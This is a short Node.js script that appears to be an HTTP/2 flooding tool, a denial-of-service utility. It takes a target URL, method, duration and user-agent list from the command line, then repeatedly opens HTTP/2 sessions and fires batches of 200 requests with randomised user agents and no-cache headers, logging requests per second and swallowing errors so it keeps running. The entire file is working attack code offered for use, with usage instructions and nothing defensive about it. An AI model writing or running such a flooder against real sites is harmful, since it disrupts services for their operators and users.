const fs = require('fs');
const http2 = require('http2');
const url = require('url');
const net = require('net');

if (process.argv.length <= 2) {
    console.log("Usage: node http2 <http method> <url> <time> <user agents>");
    console.log("Example: node http2 <http method> <http://example.com> <60> <uas.txt>");
    process.exit(-1);
}

var httpMethod = process.argv[2];
var target = process.argv[3];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[4];
var uas = fs.readFileSync(process.argv[5], 'utf8').split('\n').map((ua) => ua.trim()).filter((ua) => ua !== '');

process.on('uncaughtException', function (e) {
    console.warn(e);
});

process.on('unhandledRejection', function (e) {
    console.warn(e);
});

let count = 0;
let lastCount = 0;
let currentCount = 0;

const sendHTTP2Request = () => {
    const session = http2.connect(`http://${host}`);
    const request = session.request({
        ':method': httpMethod,
        ':path': parsed.path,
        ':scheme': parsed.protocol.replace(':', ''),
        'host': parsed.host,
        'accept': '*/*',
        'user-agent': uas[Math.floor(Math.random() * uas.length)],
        'upgrade-insecure-requests': '0',
        'cache-control': 'no-cache',
        'accept-encoding': 'none'
    });

    request.on('error', (error) => {
        console.error('HTTP/2 Request error:', error);
        session.close();
    });

    request.on('response', (headers) => {
        console.log('Received HTTP/2 response:', headers);
        session.close();
    });

    request.end();
};

var int = setInterval(() => {
    // Send HTTP/2 requests using the function
    for (var i = 0; i < 200; i++) {
        sendHTTP2Request();
        count++;
        currentCount++;
    }
}, 3500);

console.log('initiated');

setInterval(() => {
    const diff = currentCount - lastCount;
    console.log(diff, 'r/s');
    lastCount = currentCount;
}, 1000);

setTimeout(() => {
    clearInterval(int);
    console.log('Finished');
    process.exit(0);
}, time * 1000);